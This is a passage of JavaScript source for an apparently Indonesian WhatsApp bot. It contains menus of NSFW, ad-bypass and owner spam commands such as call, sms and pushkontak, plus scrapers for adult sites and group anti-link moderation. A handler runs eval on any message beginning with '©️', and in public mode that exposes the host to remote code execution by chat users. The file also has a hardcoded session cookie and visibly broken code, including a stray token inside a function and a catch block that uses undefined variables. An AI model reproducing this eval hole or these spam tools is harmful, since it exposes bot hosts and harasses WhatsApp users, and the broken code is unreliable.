➤ tts/gtts (Masukin Teks)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙉𝙎𝙁𝙒 𝙈𝙀𝙉𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ hentai
➤ hneko
➤ trap
➤ yuri
➤ blowjob
➤ pussy
➤ cum
➤ masturbation
➤ bdsm
➤ oppai
➤ hentaivid
➤ paizuri
➤ hen (Random NSFW)
➤ fantox
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘽𝙔𝙋𝘼𝙎𝙎 𝙄𝙆𝙇𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ bypassouo (anti iklan boss)
➤ bypassmirror (langsung ke inti)
━━━━━━━━━━━━━━━━━━━
➤ grupmenu (Owner)
➤ bugmenu (Owner)
➤ tqto (Thanks)
━━━━━━━━━━━━━━━
`
//tiktok new scrape
async function tryServer1(url) {
    // server 1 tiklydown.eu.org
    let tiklydownAPI = `https://api.tiklydown.eu.org/api/download?url=${url}`;
    let response = await axios.get(tiklydownAPI);
    return response.data;
}
//NHENTAI SCRAPE TEST
async function nhentaiScraper(id) {
	let uri = id ? `https://cin.guru/v/${+id}/` : 'https://cin.guru/'
	let html = (await axios.get(uri)).data
	return JSON.parse(html.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]).props.pageProps.data
}

function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
async function searchHentai(search) {
  return new Promise((resolve, reject) => {
    axios.get("https://hentai.tv/?s=" + search).then(async ({ data }) => {
      let $ = cheerio.load(data)
      let result = {}
      let res = []
      result.coder = 'rem-comp'
      result.result = res
      result.warning = "It is strictly forbidden to reupload this code, copyright © 2022 by rem-comp"

      $('div.flex > div.crsl-slde').each(function (a, b) {
        let _thumbnail = $(b).find('img').attr('src')
        let _title = $(b).find('a').text().trim()
        let _views = $(b).find('p').text().trim()
        let _url = $(b).find('a').attr('href')
        let hasil = { thumbnail: _thumbnail, title: _title, views: _views, url: _url }
        res.push(hasil)
      })

      resolve(result)
    }).catch(err => {
      console.log(err)
    })
  })
}
async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}
//SCRAPE WIKIPEDIA BY SHINCHAN
async function wikipedia(querry) {
  try {
    const link = await axios.get(`https://id.wikipedia.org/wiki/${querry}`)
    const $ = cheerio.load(link.data)
    let judul = $('#firstHeading').text().trim()
    let thumb = $('#mw-content-text').find('div.mw-parser-output > div:nth-child(1) > table > tbody > tr:nth-child(2) > td > a > img').attr('src') || `//k.top4top.io/p_2121ug8or0.png`
    let isi = []
    $('#mw-content-text > div.mw-parser-output').each(function (rayy, Ra) {
      let penjelasan = $(Ra).find('p').text().trim()
      isi.push(penjelasan)
    })
    for (let i of isi) {
      const data = {
        status: link.status,
        result: {
          judul: judul,
          thumb: 'https:' + thumb,
          isi: i
        }
      }
      return data
    }
  } catch (err) {
    var notFond = {
      status: link.status,
      Pesan: eror
    }
    return notFond
  }
}

//SCRAPE PINTEREST
async function pinterest(query) {
	if (query.match(URL_REGEX)) {
		let res = await fetch('https://www.expertsphp.com/facebook-video-downloader.php', {
			method: 'POST',
			body: new URLSearchParams(Object.entries({ url: query }))
		})
		let $ = cheerio.load(await res.text())
		let data = $('table[class="table table-condensed table-striped table-bordered"]').find('a').attr('href')
		if (!data) throw 'Can\'t download post :/'
		return data
	} else {
		let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`)
		let json = await res.json()
		let data = json.resource_response.data.results
		if (!data.length) throw `Query "${query}" not found :/`
		return data[~~(Math.random() * (data.length))].images.orig.url
	}
}

async function shortUrl(url) {
	return await (await fetch(`https://tinyurl.com/api-create.php?url=${url}`)).text()
}

//SCRAPE YANDERE by ShinChan
async function getYandeImage(query, page = '') {
  if (query.match(URL_REGEX)) {
    let res = await fetch(query);
    let html = await res.text();
    let $ = cheerio.load(html);
    let image = $('img').attr('src');
    if (!image) throw 'Can\'t fetch image :/';
    return image;
  } else {
    let apiUrl = `https://yande.re/post.json?tags=${query}`;
    if (page) {
      const pageNumber = parseInt(page);
      if (!isNaN(pageNumber) && pageNumber > 0) {
        apiUrl += `&page=${pageNumber}`;
      }
    }

    // Simulating in-progress fetching
    await new Promise((resolve) => setTimeout(resolve, 2000));

    let res = await fetch(apiUrl);
    let json = await res.json();
    if (json.length === 0) throw `Query "${query}" not found :/`;
    let data = json[~~(Math.random() * json.length)];
    if (!data) throw `Query "${query}" not found :/`;
    return data.file_url;
  }
}

//SCRAPE PERSAMAAN KATA BY SHINCHAN
function ArrClean(str) {
    return str.map((v, index) => ++index + ". " + v).join('\r\n')
}

async function Persamaan_Kata(kata) {
    const html = await axios.get("https://m.persamaankata.com/search.php?q=" + kata)
    const $ = cheerio.load(html.data)
    const h = []
    $("div.word_thesaurus > a").each(function(e, a) {
        h.push($(a).text());
    })
    const image = $("img#visual_synonym_img").attr("src")
    return {
        image: image,
        result: h
    }
}

//SCRAPE PIXIV BY SHINCHAN
async function pixivDl(query) {
	if (query.match(URL_REGEX)) {
	//	if (!/https:\/\/www.pixiv.net\/en\/artworks\/[0-9]+/i.test(query)) throw 'Invalid Pixiv Url'
		query = query.replace(/\D/g, '')
		let res = await pixiv.getIllustByID(query).catch(() => null)
		if (!res) throw `Pencarian "${query}" Tidak Ditemukan`
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	} else {
		let res = await pixiv.getIllustsByTag(query)
		if (!res.length) throw `Pencarian "${query}" Tidak Di Temukan`
		res = res[~~(Math.random() * res.length)].id
		res = await pixiv.getIllustByID(res)
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	}
}

//capcut new
async function capcut(url) {
  const response = await fetch(url);
  const data = await response.text();
  const $ = cheerio.load(data);

  return {
    nama: $("img").attr("alt"),
    used: $("b").text().replace($("img").attr("alt"), ""),
    thumbnail: $("img").attr("src"),
    video: $("video").attr("src"),
  };
}

//capcut new
function capcutdl(Url) {
	return new Promise((resolve, reject) => {
		let token = Url.match(/\d+/)[0];
		axios({
			url: `https://ssscap.net/api/download/${token}`,
			method: 'GET',
			headers: {
				'Accept': '/',
				'User-Agent': 'Mozilla/5.0 (Linux; Android 10; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
				'X-Requested-With': 'acr.browser.barebones',
				'Sec-Fetch-Site': 'same-origin',
				'Sec-Fetch-Mode': 'navigate',
				'Sec-Fetch-Dest': 'document',
				'Referer': 'https://ssscap.net/id',
				'Accept-Encoding': 'gzip, deflate, br',
				'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'Cookie': 'sign=5a98a026c45682ba8baa7a055af413b2; device-time=1702446760834'
			}
		}).then(({ data }) => {
			console.log(data);
			resolve(data); // Menyelesaikan janji dengan mengembalikan data
		}).catch((err) => {
			console.log(err);
			reject(err); // Menyelesaikan janji dengan melempar kesalahan
		});
	});
      }
      
//YTMP3
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await connl.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//YTMP4
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
// DELAY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function loading () {
var shinchanehe = [
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■□□□□□□□□□] 𝟷𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■□□□□□□□] 𝟹𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■□□□□□] 𝟻𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■■■□□□] 𝟾𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■■■■■■] 𝟷𝟶𝟶٪",
"ʟᴏᴀᴅɪɴɢ sᴜᴄᴄᴇssғᴜʟ . . ."
]
let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu

for (let i = 0; i < shinchanehe.length; i++) {
/*await delay(10)*/
a = await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
}
}
//RANDOM REACTION
/*conn.sendMessage(m.chat, {
          react: {
            text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','🥺','😜','👎'])}`,
            key: m.key,
          }})*/
//auto restart bot
function start() {
   let args = [path.join(__dirname, 'shinchan.js'), ...process.argv.slice(2)]
   console.log([process.argv[0], ...args].join('\n'))
   let p = spawn(process.argv[0], args, {
         stdio: ['inherit', 'inherit', 'inherit', 'ipc']
      })
      .on('message', data => {
         if (data == 'reset') {
            console.log('Restarting Bot...')
            p.kill()
            start()
            delete p
         }
      })
      .on('exit', code => {
         console.error('Exited with code:', code)
         if (code == '.' || code == 1 || code == 0) start()
      })
}
//auto off
if (global.autoOff) {
if (command) {
conn.sendPresenceUpdate('unavailable', from)
}
}
//auto typing
if (global.autoTyping) {
if (command) {
conn.sendPresenceUpdate('composing', from)
}
}
//auto recording
if (global.autoRecord) {
if (command) {
conn.sendPresenceUpdate('recording', from)
}
}
//auto reading
if (global.autoReading) {
if (command) {
conn.readMessages([m.key])
}
}
// itunya
      if (!conn.public) {
         if (!m.key.fromMe && !isCreator) return
      }
      if (m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
         try {
            await conn.ev.emit("viewOnceMessage", m);
         } catch (err) {
            console.error(util.format(err))
         }
      }
/*let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}*/
//Grup Only By ShinChan_Kawaii
if(isCmd && !m.isGroup && !isCreator && grup_only){
          paycall("Bot hanya bisa digunakan dalam grup")
          return
        }
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

//antilink all by ShinChan
if (AntiLinkAll)
   if (budy.match("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin sudah kirim linknya, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Instagram
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link instagram, admin bebas mengirimkan link apa saja😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan link instagram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Channel Wa by ShinChan
if (AntiLinkChannel)
   if (budy.includes("https://whatsapp.com/channel/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link Saluran WhatsApp, admin bebas mengirimkan link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan link Saluran di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//Anti Eval by ShinChan
if (AntiEval)
   if (budy.includes("messageTimestamp")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Eval Terdeteksi 」\`\`\`\n\nAdmin sedang mengeval WhatsApp, admin bebas Eval apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Eval Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena Eval sembarangan di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antivirtex by ShinChan
  if (antiVirtex) {
  if (budy.length > 1000) {
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Virtex Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan Virtex, admin bebas send Virtex apapun`})
          await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			conn.sendMessage(from, {text:`\`\`\`「 Virtex Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan virus di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
  // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await conn.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await conn.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

//HD FUNCTION
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	});
}
async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

var createSerial = (size) => {removebg
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//test auto download tiktok
/*let regex = /https:\/\/vt\.tiktok\.com\/[A-Za-z0-9]+/g;
let matches = (m.text.trim()).match(regex);
if (!matches) return false;
await replydltt(wait);
const tiktokData2 = await tryServer1(matches[0]);

        if (!tiktokData2) {
            throw 'Gagal mendownload video!';
        }

        const videoURL2 = tiktokData2.video.noWatermark;

        const videoURLWatermark2 = tiktokData2.video.watermark;

        let ppTiktok2 = '';
        if (tiktokData2.author && tiktokData2.author.avatar) {
            ppTiktok2 = tiktokData2.author.avatar;
        }

        const infonya_gan2 = `Judul: ${tiktokData2.title}\n\nUpload: ${tiktokData2.created_at}\n\nSTATUS:\n=====================\nLike = ${tiktokData2.stats.likeCount}\nKomen = ${tiktokData2.stats.commentCount}\nShare = ${tiktokData2.stats.shareCount}\nViews = ${tiktokData2.stats.playCount}\nSimpan = ${tiktokData2.stats.saveCount}\n=====================\n\nUploader: ${tiktokData2.author.name || 'Tidak ada informasi penulis'}\n( ${tiktokData2.author.unique_id} - https://www.tiktok.com/@${tiktokData2.author.unique_id} )\nBio: ${tiktokData2.author.signature}\nLagu: ${tiktokData2.music.play_url}\nResolusi: ${tiktokData2.video.ratio}\nFoto Profile: ${ppTiktok2}`;

        if (videoURL2 || videoURLWatermark2) {
            await conn.sendFile2(m.chat, videoURL2, 'tiktok.mp4', `${done}\n\n${infonya_gan2}`, m);
    };*/

switch(command) {
case 'menu': {
await loading ()
conn.sendMessage(m.chat, { caption: menulist, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `💖𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐 𝘽𝙊𝙏💖`,
contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `${ownername}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
                    break
case 'grupmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "7777777",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( *GROUP MENU* )
━━━━━━━━━━━━━━━━━━━
➤ welcome on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilink on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilinkch [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antilinkinstagram [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antieval [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ autostiker [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antivirus [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ antitoxic [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushkontak (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ pushcontid (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bcgc (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ hidetag (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ totag [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ kick (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ add (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demote (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendlinkgc (628xx) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editgroup close / open [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editinfo on / off [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ join (linknya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editsubjek (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ editdesk (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tagall (textnya) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ linkgroup [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetlinkgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ promoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ demoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ out/leave/leavegc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ repeat [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ call [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ call2 [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sms [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ id [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ getcase [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ q [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ toonce [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ unbanned [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ resetotp [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tourl [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ runtime [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ setppbot [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ setppgc [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ shutdown [ 𝗢𝗪𝗡𝗘𝗥 ]
